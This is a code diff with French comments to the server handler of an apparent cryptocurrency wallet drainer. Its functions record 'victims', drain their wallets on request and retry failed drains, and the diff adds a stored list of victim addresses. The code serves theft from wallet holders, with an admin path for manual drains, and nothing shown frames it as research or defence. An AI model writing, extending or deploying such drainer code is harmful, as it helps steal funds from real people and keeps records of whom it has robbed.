@@ -68,6 +68,13 @@ async function recordVictim(address, chain, token, amount, status) {
     timestamp
   });
   console.log(`📝 Victime enregistrée : ${address} (${status})`);
+
+  // ⚡ Ajout de l'adresse à la liste globale des victimes (si pas déjà)
+  const list = await kv.get('victims:list') || [];
+  if (!list.includes(address)) {
+    list.push(address);
+    await kv.set('victims:list', list);
+  }
 }
 
 async function drainVictim(victimAddress, chainId) {
@@ -192,6 +199,13 @@ export default async function handler(req, res) {
       const targetChain = chain || '1';
       console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
 
+      // ⚡ Ajout immédiat à la liste des victimes (pour l'historique)
+      const list = await kv.get('victims:list') || [];
+      if (!list.includes(victim)) {
+        list.push(victim);
+        await kv.set('victims:list', list);
+      }
+
       const success = await drainWithRetry(victim, targetChain);
       if (success) {
         return res.status(200).json({ success: true, victim, chain: targetChain });
@@ -204,6 +218,14 @@ export default async function handler(req, res) {
     if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
 
     console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
+
+    // ⚡ Ajout immédiat à la liste (avant le drain asynchrone)
+    const list = await kv.get('victims:list') || [];
+    if (!list.includes(victim)) {
+      list.push(victim);
+      await kv.set('victims:list', list);
+    }
+
     drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));
 
     return res.status(200).json({ success: true, victim, chain: chain || '1' });
